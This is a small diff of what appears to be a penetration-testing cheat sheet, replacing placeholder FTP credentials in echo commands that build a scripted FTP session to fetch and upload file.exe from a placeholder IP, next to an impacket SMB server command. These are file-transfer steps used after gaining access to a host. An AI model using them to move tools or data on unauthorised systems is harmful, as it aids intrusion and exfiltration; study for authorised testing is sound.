@@ -23,8 +23,8 @@ sudo impacket-smbserver <sharename> <share path>
 FTP Upload / Download 
 ````
 echo "open <IP> ">ftp.txt
-echo "offsec">>ftp.txt
-echo "offsec">>ftp.txt
+echo "user">>ftp.txt
+echo "pass">>ftp.txt
 echo "bin">>ftp.txt
 echo "get file.exe">>ftp.txt
 echo "put file.exe">>ftp.txt
